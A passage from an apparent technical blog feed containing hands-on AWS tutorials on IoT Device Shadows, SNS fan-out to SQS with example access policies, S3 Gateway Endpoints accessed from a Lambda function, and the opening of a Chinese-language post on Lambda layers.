<span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">21</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>But the reported state is not “Black”.</p><p>you can see the event published to the accepted topic.</p><p><img src="https://i.imgur.com/pzVidVy.png" alt="Imgur"></p><p>Meanwhile, the message published to the document topic</p><p><img src="https://i.imgur.com/ZKmF0vG.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>You will found the state change from <strong>(Desired: “Blue”, Reported: “Blue”)</strong> to <strong>(Desired: “Black”, Reported: “Blue”)</strong> and the final state is <strong>(Desired: “Black”, Reported: “Black”)</strong>.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[+] Create a virtual device with Amazon EC2 - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html">https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html</a><br>[+] Tutorial: Provisioning your device in AWS IoT - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html">https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html</a><br>[+] Tutorial: Installing the Device SDK and running the sample application for Device Shadows - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html">https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html</a><br>[+] Tutorial: Interacting with Device Shadow using the sample app and the MQTT test client - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html">https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html</a><br>[+] Reserved topics - Shadow topics - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow">https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> IoT Shadow </tag>
            
            <tag> MQTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: Amazon SNS Fan out to Amazon SQS</title>
      <link href="/posts/efc78ef4.html"/>
      <url>/posts/efc78ef4.html</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Amazon SNS offen works well with Amazon SQS, by subscribing SQS to SNS, the SNS service can push messages to SQS. <strong>This may eliminating the need to periodically check or “poll” for updates.</strong></p><h3 id="What-is-Amazon-SQS"><a href="#What-is-Amazon-SQS" class="headerlink" title="What is Amazon SQS?"></a>What is Amazon SQS?</h3><p>By official definition</p><blockquote><p>Amazon SQS is a message queue service used by distributed applications to exchange messages through a polling model, and can be used to decouple sending and receiving components—without requiring each component to be concurrently available. </p></blockquote><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><blockquote><p>The <strong>Fanout</strong> scenario is when a message published to an SNS topic is replicated and pushed to multiple endpoints, such as Kinesis Data Firehose delivery streams, Amazon SQS queues, HTTP(S) endpoints, and Lambda functions. This allows for parallel asynchronous processing.<br>For example, you can develop an application that publishes a message to an SNS topic whenever an order is placed for a product. Then, SQS queues that are subscribed to the SNS topic receive identical notifications for the new order. An Amazon Elastic Compute Cloud (Amazon EC2) server instance attached to one of the SQS queues can handle the processing or fulfillment of the order. And you can attach another Amazon EC2 server instance to a data warehouse for analysis of all orders received.[1]</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>Here we will go through each step of fan out to Amazon SQS.</p><p>The initial step is to remember both SNS arn and SQS arn.</p><h3 id="Create-SQS-Queue"><a href="#Create-SQS-Queue" class="headerlink" title="Create SQS Queue"></a>Create SQS Queue</h3><p>First, you’ll need to create a standard queue in SQS console</p><p><img src="https://i.imgur.com/RRffWm5.png" alt="Imgur"></p><p>After creating the standard queue, it will shows the arn.</p><p>Make sure noted this arn, you’ll need to provide this arn when creating the subscriptions</p><h3 id="Create-SNS-Topic"><a href="#Create-SNS-Topic" class="headerlink" title="Create SNS Topic"></a>Create SNS Topic</h3><p>Second, you need to create a SNS topic in the SNS console..</p><p><img src="https://i.imgur.com/ygA6g1P.png" alt="Imgur"></p><p>And again, you’ll need to note the topic arn.</p><h3 id="Provide-Permission-to-SNS-to-send-messages-to-SQS"><a href="#Provide-Permission-to-SNS-to-send-messages-to-SQS" class="headerlink" title="Provide Permission to SNS to send messages to SQS"></a>Provide Permission to SNS to send messages to SQS</h3><p>By default, SNS will not have permission to send messages to SQS, so you need to provide permission to SNS for sending messages.</p><ul><li>Go to SQS Console</li><li>Press “Edit” in the top corner</li><li>Scroll down to the “Access Policy”</li></ul><p><img src="https://i.imgur.com/keRSRlR.png" alt="Imgur"></p><ul><li>Append new statement in the Access Policy</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns.amazonaws.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:SendMessage&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:xxxxxxxxxxxx:QueueforSNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ArnEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aws:SourceArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:xxxxxxxxxxxx:StandardTopicforSQS&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UWjKND7.png" alt="Imgur"></p><h3 id="Subscribe-SQS-queue-to-SNS-topic"><a href="#Subscribe-SQS-queue-to-SNS-topic" class="headerlink" title="Subscribe SQS queue to SNS topic"></a>Subscribe SQS queue to SNS topic</h3><p>Now you’ll need to subscribe the SQS queue to the SNS topic.</p><ul><li>Go to SNS console</li><li>Scroll down and choose “Create Subscription”</li></ul><p><img src="https://i.imgur.com/qTEPbQb.png" alt="Imgur"></p><ul><li>Choose your topic arn</li><li>Set the protocal to SQS</li><li>Choose the SQS arn</li></ul><p><img src="https://i.imgur.com/voJqHuB.png" alt="Imgur"></p><p>Once complete, you will notice that the subscripe confirmation also completes. If you create a SQS type subscription by using console, you don’t need confirm the subscription manually.</p><p><img src="https://i.imgur.com/Jr4Brob.png" alt="Imgur"></p><blockquote><p><strong>But if you create a cross-account subscription, you will receive the confirmation url in the SQS queue, and you will need to click the confirmation URL. [3]</strong></p></blockquote><h3 id="Provide-Permission-to-User-for-topic-x2F-queue-operations"><a href="#Provide-Permission-to-User-for-topic-x2F-queue-operations" class="headerlink" title="Provide Permission to User for topic&#x2F;queue operations"></a>Provide Permission to User for topic&#x2F;queue operations</h3><p>You can add permissions to an IAM User to publish SNS messages to a topic.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>And you also need to provide permissions to SQS queue to recieve and delete messages</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue2&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However,if you want to perform cross-account operations, you will need to provide permissions to the other account.</p><p>For example, if you want to let acount: 111122223333 to publish messages to SNS topic in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>if you want to let acount: 111122223333 to perform receive abd delete messages to queue in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Test-subscription"><a href="#Test-subscription" class="headerlink" title="Test subscription"></a>Test subscription</h3><p>Now we can test the message delivery to the queue.</p><ul><li>Go to the SNS console</li><li>Press “Push Message” in the top right corner </li><li>Enter the message subject and meesage body</li></ul><p><img src="https://i.imgur.com/iu7VJVX.png" alt="Imgur"><br><img src="https://i.imgur.com/ppgfOf0.png" alt="Imgur"></p><ul><li>Go to the SQS console</li><li>Press “Send and Receive Message” in the top right corner</li><li>Scroll down , and press the “Poll for all messages”</li><li>And you’ll find the messages are in polling progress.</li></ul><p><img src="https://i.imgur.com/aYWXVIE.png" alt="Imgur"></p><ul><li>Then the test meesages showed in the console</li></ul><p><img src="https://i.imgur.com/Vj3cCc9.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>We successfully fan out the message from the Amazon SNS to the Amazon SQS. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario">https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html</a><br>[3]<a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> SNS </tag>
            
            <tag> SQS </tag>
            
            <tag> Publish-Subscribe-Model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: S3 Gateway Endpoints</title>
      <link href="/posts/e7e295f6.html"/>
      <url>/posts/e7e295f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="What-is-S3-Gateway-Endpoints"><a href="#What-is-S3-Gateway-Endpoints" class="headerlink" title="What is S3 Gateway Endpoints?"></a>What is S3 Gateway Endpoints?</h1><p><img src="https://i.imgur.com/MUsKNi4.png" alt="Imgur"></p><p>Let’s consider a scenario</p><blockquote><p>How could your Lambda function access the content in the S3 bucket?</p></blockquote><p>If you want a service to access the content in the S3 bucket, it usually go through VPC endpoint. S3 supports two types of VPC endpoint,each of which is <strong>Gateway endpoint</strong> and <strong>Interface endpoint</strong></p><!--如果要通過一個服務來存取 S3 當中的內容，通常是會通過 VPC Endpoint，而在 S3 當中又支援兩種不同的 VPC Endpoint類型，分別是 **Gateway Endpoint** 以及 **Interface Endpoint**--><p>The diffeences between two types of VPC endpoints are listed below</p><table><thead><tr><th>S3 Gateway Endpoints</th><th>S3 Interface Endpoints</th></tr></thead><tbody><tr><td>Use S3 Public IP Address</td><td>Use Private IP Address in VPC to access S3</td></tr><tr><td>Use the same S3 DNS Name</td><td>Name must include VPC Endpoint ID [3]</td></tr><tr><td>cannot access internally</td><td>can access internally</td></tr><tr><td>cannot access from other AWS region</td><td>can access from other AWS region by using VPC peering or AWS Transit gateway</td></tr><tr><td>Free</td><td>In chrarge</td></tr></tbody></table><!-- >> **所以當你的情境是你在同個 Region 底下有個 Lambda 函數想要存取 S3 的內容，那就很適合使用 Gateway Endpoint** --><blockquote><p>So if your scenario is that a Lambda function want to access the content in S3 bucket in the same region, it is great to utilize the Gateway Endpoint</p></blockquote><h2 id="Consideration-of-S3-Gateway-Endpoint"><a href="#Consideration-of-S3-Gateway-Endpoint" class="headerlink" title="Consideration of S3 Gateway Endpoint"></a>Consideration of S3 Gateway Endpoint</h2><p>It is worth to mestion that there are several things you need to consider before choosing S3 Gateway Endpoints, make sure you go through the section in the official documentation</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3">https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3</a></p></blockquote><h2 id="Private-DNS"><a href="#Private-DNS" class="headerlink" title="Private DNS"></a>Private DNS</h2><p>When you are trying yo create Gateway Endpoint or Interface Endpoint for your S3, you can decide creating private DNS for cost down.</p><blockquote><p>This is implement by Route53 Resolver<br>For detail you can check：<a href="https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html">https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html</a></p></blockquote><h1 id="Steps-for-building-Gateway-Endpoint"><a href="#Steps-for-building-Gateway-Endpoint" class="headerlink" title="Steps for building Gateway Endpoint"></a><a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">Steps for building Gateway Endpoint</a></h1><ul><li>Go to AWS Console to create the endpoint</li></ul><blockquote><p>VPC &#x2F; Endpoints &#x2F; Create Endpoint</p></blockquote><p><img src="https://i.imgur.com/asOslk6.png" alt="Imgur"></p><ul><li>Choose <code>AWS services</code> , and <code>com.amaazonaws.us-east-1.s3</code></li></ul><p><img src="https://i.imgur.com/ujgXmUq.png" alt="Imgur"></p><ul><li>Then, press create endpoints</li></ul><h2 id="Associate-Route-Table"><a href="#Associate-Route-Table" class="headerlink" title="Associate Route Table"></a>Associate Route Table</h2><ul><li>Make sure the route table that assoicate to the gateway endpoint is clean.<blockquote><p>If you don’t have on, then make one.</p></blockquote></li></ul><p><img src="https://i.imgur.com/cI4mrOt.png" alt="Imgur"></p><h2 id="Configure-policy"><a href="#Configure-policy" class="headerlink" title="Configure policy"></a>Configure policy</h2><ul><li>For testing purposes, I choose <code>Full Access</code></li></ul><p><img src="https://i.imgur.com/kiQtSej.png" alt="Imgur"></p><ul><li>Then, press create endpoint</li></ul><h2 id="Check-the-routing"><a href="#Check-the-routing" class="headerlink" title="Check the routing"></a>Check the routing</h2><p>After establishing the endpoint, you can check if the default route of route table is well configured</p><p><img src="https://i.imgur.com/3Ajfl91.png" alt="Imgur"></p><p>Next, we must configure a Lambda function for accessing S3 bucket.</p><h2 id="Configure-Lambda-Function"><a href="#Configure-Lambda-Function" class="headerlink" title="Configure Lambda Function"></a>Configure Lambda Function</h2><p>If you put a Lambda funciton into a VPC, it will attach to 2 subnets by defaults.</p><p>Make sure two subnet have default route to S3 Gateway Endpoints.</p><p><img src="https://i.imgur.com/XmbfUKe.png" alt="Imgur"><br><img src="https://i.imgur.com/AP6fZGy.png" alt="Imgur"></p><ul><li>Create Lambda function, and enable the VPC</li></ul><p><img src="https://i.imgur.com/eBfWExA.png" alt="Imgur"></p><ul><li>Lambda Code</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATE CLIENT&quot;</span>)</span><br><span class="line">    s3 = boto3.client(<span class="string">&quot;s3&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;START REQUEST&quot;</span>)</span><br><span class="line">    resp = s3.list_objects(Bucket=<span class="string">&quot;testbucket4-s3gateway-endpoint&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>In this Lambda code, Lambda will try to list the objects in the bucket, can print out the information of  response object in the log.</p><ul><li>Configure policy of Lambda execution role</li></ul><p>I simply attach AWS Managed Policy <code>AmazonS3FullAccess</code> to the execution role for testing</p><blockquote><p>Notice, you should not give full access to your Lambda function in production mode, make sure giving adequient permssion to the role.</p></blockquote><p><img src="https://i.imgur.com/U3mPX0h.png" alt="Imgur"></p><h2 id="Check-invocations"><a href="#Check-invocations" class="headerlink" title="Check invocations"></a>Check invocations</h2><ul><li>Press <code>test</code> button in the Lambda console, you’ll noticee the lambda get invoked successfully</li></ul><p><img src="https://i.imgur.com/WB3iyyD.png" alt="Imgur"></p><ul><li>Then you need to check the invocation logs in CloudWatch</li></ul><p><img src="https://i.imgur.com/j5q8yCp.png" alt="Imgur"></p><p>You can see that the object information were listed and printed out in the invocation logs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> Endpoints </tag>
            
            <tag> Gateway </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda_layer 概念和實作</title>
      <link href="/posts/f40d2e89.html"/>
      <url>/posts/f40d2e89.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>針對 Lambda 設定，絕大多數人一定碰過 <code>ImportModuleError</code>  所以各位可以跟著以下的情境，開一個一樣的 Lambda 環境逐步操作。</p><h2 id="情境"><a href="#情境" class="headerlink" title="情境"></a>情境</h2><ul><li>Region: <code>IAD(us-east-1)</code></li><li>Runtime: <code>Python3.11</code></li><li>Lambda Name: “ITHomeLambdaFunction”</li><li>Lambda code<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment"># TODO implement</span></span><br><span class="line">    x = requests.get(<span class="string">&#x27;https://www.ntust.edu.tw/&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x.text)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="Error-Runtime-ImportModuleError"><a href="#Error-Runtime-ImportModuleError" class="headerlink" title="[Error]: Runtime.ImportModuleError"></a>[Error]: Runtime.ImportModuleError</h2><p>如果你按照上述情境部署，並且進行測試，可能會報出類似下面的錯誤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;errorMessage&quot;: &quot;Unable to import module &#x27;lambda_function&#x27;: No module named &#x27;requests&#x27;&quot;,</span><br><span class="line">  &quot;errorType&quot;: &quot;Runtime.ImportModuleError&quot;,</span><br><span class="line">  &quot;requestId&quot;: &quot;.......&quot;,</span><br><span class="line">  &quot;stackTrace&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個錯誤的原因在於，在 AWS Lambda python 3.8 Runtime 之後的版本就沒有原生支援 requests 模組，會需要自己添加<strong>層（layer）</strong></p><h2 id="什麼是-Lambda-層（Layer）"><a href="#什麼是-Lambda-層（Layer）" class="headerlink" title="什麼是 